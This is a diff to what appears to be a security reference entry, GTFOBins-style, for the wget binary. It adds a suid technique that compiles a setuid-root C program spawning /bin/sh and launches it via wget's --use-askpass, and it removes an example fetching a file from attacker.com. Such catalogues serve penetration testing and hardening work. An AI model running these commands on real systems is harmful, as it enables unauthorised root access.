@@ -31,11 +31,21 @@ functions:
         chmod +x $TF
         wget -v --use-askpass=$TF 0
   suid:
-    - description: Fetch a remote file via HTTP GET request.
       code: |
-        URL=http://attacker.com/file_to_get
-        LFILE=file_to_save
-        ./wget $URL -O $LFILE
+        TF1=$(mktemp --suffix .c)
+        cat << EOI > $TF1
+        #include <stdio.h>
+        #include <sys/types.h>
+        #include <unistd.h>
+        int main() {
+          setuid(0);
+          setgid(0);
+          system("/bin/sh 1>&0 2>&0");
+        }
+        EOI
+        TF2=$(mktemp)
+        gcc -o $TF2 $TF1
+        wget --use-askpass=$TF2 0
   sudo:
     - code: |
         TF=$(mktemp)
